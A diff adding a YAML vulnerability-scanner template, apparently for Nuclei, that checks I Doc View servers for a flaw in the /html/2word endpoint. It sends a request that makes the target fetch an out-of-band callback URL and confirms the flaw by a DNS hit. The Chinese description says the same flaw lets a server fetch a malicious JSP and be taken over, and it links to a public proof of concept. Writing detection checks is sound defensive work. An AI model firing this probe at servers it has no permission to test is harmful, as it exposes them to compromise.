@@ -1,0 +1,24 @@
+
+id: idocview-2word-upload
+
+info:
+  name: I Doc View任意文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: I DOC VIEW是一个在线的文档查看器，其中的/html/2word接口因为处理不当，导致可以远程读取任意文件，通过这个接口导致服务器下载恶意的JSP进行解析，从而RCE。
+  reference:
+    - https://www.4awl.net/654.html
+    - https://github.com/wy876/POC/blob/main/I%20Doc%20View%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+
+
+http:
+  - raw:
+      - |
+        GET /html/2word?url=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
